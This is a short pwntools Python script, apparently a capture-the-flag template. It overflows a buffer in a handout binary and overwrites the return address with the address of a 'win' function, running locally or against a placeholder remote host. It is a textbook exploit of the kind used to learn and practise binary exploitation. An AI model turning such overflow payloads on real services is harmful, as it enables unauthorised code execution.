from pwn import *

elf = context.binary = ELF(f"handout/main") # Change this to the path of the binary

# Find the offset of the buffer overflow
def padding(i = 128, cyclic=False):
    if cyclic:
        print(cyclic(i))
        cyc = str(input("Enter the cyclic value: "))
        return (b'A' * cyclic_find( cyc ))
    return (b'A' * i)

# Remote or local connection
def start(remote=False):
    if remote:
        return remote("ip", 1337)
    return process(elf.path)


# Main

p = start()

# Create the payload
PADDING = padding(64, cyclic=False)
FUNCTION = p32(elf.sym["win"]) # Change this to the name of the function

p.sendline(PADDING + FUNCTION)

p.interactive()